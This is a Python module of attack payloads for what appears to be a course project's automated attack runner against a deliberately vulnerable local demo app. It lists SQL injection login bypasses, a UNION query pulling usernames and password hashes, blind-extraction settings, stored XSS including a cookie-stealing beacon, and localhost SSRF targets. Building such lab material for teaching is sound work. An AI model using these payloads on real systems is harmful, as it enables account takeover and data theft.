"""Predefined attack payloads used by attacks/automation.py.

Kept separate from the runner so the payload set (what the course proposal
calls "rule-base data, simulation parameters") is easy to review and cite on
its own, independent of the HTTP/reporting logic.
"""

# Dictionary-based login-bypass payloads tried as the *username* field
# against the vulnerable login endpoint. The password field is left as a
# harmless value since every payload comments the rest of the query out.
SQLI_DICTIONARY_LOGIN_PAYLOADS = [
    "admin'--",
    "admin' #",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin' OR '1'='1'--",
    "' OR 'a'='a",
    "'; --",
]

# Union-based payload injected into the vulnerable employee-search query
# string. Column count/types must line up with the 7-column employees
# SELECT (id, full_name, email, department, job_title, location, status) so
# the injected SELECT from `users` slots into the same result columns. The
# real query template spreads the same {search_term} across four separate
# LIKE clauses on their own lines, so a line comment (--) only silences the
# rest of the line it lands on - the following OR/ORDER BY lines are left
# dangling and raise a syntax error. An unterminated block comment (/*)
# swallows everything after it instead, regardless of line breaks.
SQLI_UNION_SEARCH_PAYLOAD = (
    "zzz' UNION SELECT id, username, email, password_hash, "
    "'union-demo', 'union-demo', 'union-demo' FROM users /*"
)

# Alphabet tried per character position during blind boolean-based
# extraction. Keep this small so the demo finishes in a few seconds.
BLIND_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_."
BLIND_MAX_LENGTH = 10

# Stored XSS payloads posted to the shared comment wall. The first is the
# "visible" proof (a JS alert marker we can detect in raw HTML); the second
# is the cookie-theft beacon described in the project proposal.
XSS_PAYLOADS = [
    "<script>window.__xss_automation_marker = 'popped';</script><b>xss-demo</b>",
    "<img src=x onerror=\"fetch('/modules/xss/collect?value='+document.cookie)\">",
]

# URLs handed to the vulnerable SSRF fetcher. The internal one should only
# succeed when the *server* requests it, not a direct outside caller.
SSRF_TARGETS = [
    "http://127.0.0.1:5000/internal/secret-report",
    "http://127.0.0.1:5000/",
]
